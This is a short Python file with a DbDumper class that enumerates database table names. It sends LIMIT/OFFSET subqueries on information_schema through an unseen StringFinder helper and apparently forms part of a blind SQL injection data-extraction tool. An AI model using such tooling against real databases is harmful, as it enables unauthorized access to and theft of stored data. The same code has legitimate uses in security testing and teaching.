from string_finder import StringFinder

class DbDumper:
    
    def __init__(self, string_finder):
        self.sf = string_finder


    def tables(self):
        return self.list_query('table_name', 'information_schema.tables')

    def list_query(self, field, table):
        items_ = []
        i = 0        
        while True:
            item = self.sf.read_string("(SELECT {} from {} LIMIT 1 OFFSET {})".format(field, table, i))
            if item == None:
                break;
            items_.append(item)
            i += 1
        return items_
    
